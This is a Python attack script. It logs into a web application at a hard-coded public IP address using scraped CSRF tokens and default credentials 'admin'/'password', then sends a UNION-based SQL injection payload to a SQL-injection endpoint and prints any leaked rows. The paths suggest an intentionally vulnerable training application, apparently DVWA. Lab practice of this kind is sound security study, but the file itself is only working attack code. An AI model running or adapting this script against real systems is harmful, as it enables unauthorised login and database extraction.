
import requests
import re

session = requests.Session()

# Get login page to extract token
response = session.get('http://31.97.117.123/login.php')
match = re.search(r"user_token'\s+value='([a-f0-9]+)'", response.text)
token = match.group(1) if match else None

# Login
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': token
}

response = session.post('http://31.97.117.123/login.php', data=login_data)

# Test simple UNION injection 
sqli_payload = "999 UNION SELECT 1,2,3,4,5-- -"
response = session.get('http://31.97.117.123/vulnerabilities/sqli/', params={'id': sqli_payload, 'Submit': 'Submit'})

# Save the full response to analyze
with open('/tmp/sqli_response.html', 'w') as f:
    f.write(response.text)

print("Full page content saved.")

# Look for common result patterns
if 'First name:' in response.text:
    print("Found 'First name:' pattern")
    idx = response.text.find('First name:')
    print(response.text[idx:idx+300])
elif '<pre>' in response.text:
    print("Found <pre> tag")
    idx = response.text.find('<pre>')
    end = response.text.find('</pre>', idx)
    print(response.text[idx:end+6])
else:
    print("Result patterns not found. Looking at 2000 characters around middle of page...")
    mid = len(response.text) // 2
    print(response.text[mid-500:mid+500])

